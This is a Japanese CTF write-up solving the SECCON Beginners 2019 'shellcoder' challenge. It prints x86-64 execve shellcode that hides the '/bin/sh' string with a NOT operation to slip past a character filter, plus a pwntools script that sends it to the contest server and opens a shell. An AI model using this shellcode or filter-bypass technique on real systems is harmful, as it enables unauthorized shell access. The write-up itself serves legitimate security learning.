# はじめに
2019年5月25日〜26日、Szarnyさんと一緒SECCONのCTF For Beginners (ctf4b)に参加し、最後に二人のチームが2707ポイントを集め、666参加チームの中26位で終わりました。

以下、解けた問題「shellcoder」の解法を紹介していきます。
# shellcoder

```
$ checksec ./shellcoder 
[*] '/ctf/SECCON2019-ctf4b/take2/Pwnable/shellcoder/shellcoder'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
`radare2`で逆アセンブリを読むと、プログラムの動作がわかりました。

単にシェルコードを求めるプログラムです。ただし、`['b', 'i', 'n', 's', 'h']`という文字が入っていると実行せずに終了されてしまう。このように：
```
$ ndisasm -b 64 shellcode
00000000  4831C0            xor rax,rax
00000003  4831F6            xor rsi,rsi
00000006  99                cdq
00000007  48BF2F2F62696E2F  mov rdi,0x68732f6e69622f2f
         -7368
00000011  50                push rax
00000012  57                push rdi
00000013  4889E7            mov rdi,rsp
00000016  B03B              mov al,0x3b
00000018  0F05              syscall
$
$ (cat shellcode; cat) | ./shellcoder
Are you shellcoder?
Payload contains invalid character!!

$ 
```
というわけで、禁止文字を含まないシェルコードならば良さそうです。例えばコマンド文字列が否定演算で隠されたシェルコード：
```
$ ndisasm -b 64 shellcode
00000000  4831C0            xor rax,rax
00000003  4831F6            xor rsi,rsi
00000006  99                cdq
00000007  48BFD09D9691D08C  mov rdi,0xff978cd091969dd0
         -97FF
00000011  48F7D7            not rdi
00000014  50                push rax
00000015  57                push rdi
00000016  4889E7            mov rdi,rsp
00000019  B03B              mov al,0x3b
0000001B  0F05              syscall
$
$ (cat shellcode; cat) | ./shellcoder
Are you shellcoder?
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
^C
$
```
```python
#!/usr/bin/env python2
from pwn import *

p = remote("153.120.129.186", 20000)

shellcode = "\x48\x31\xc0\x48\x31\xf6\x99\x48\xbf\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd7\x50\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
p.sendlineafter("\n", shellcode)
p.interactive()
p.close()
```
```
$ ./exploit.py 
[+] Opening connection to 153.120.129.186 on port 20000: Done
[*] Switching to interactive mode
$ id
uid=40968 gid=40000(shellcoder) groups=40000(shellcoder)
$ ls
flag.txt
shellcoder
$ cat flag.txt
ctf4b{Byp4ss_us!ng6_X0R_3nc0de}
$ 
[*] Closed connection to 153.120.129.186 port 20000
```
`ctf4b{Byp4ss_us!ng6_X0R_3nc0de}`というフラグを手に入れます。

以上 shellcoder の解法でした。読んで頂き、ありがとうございました！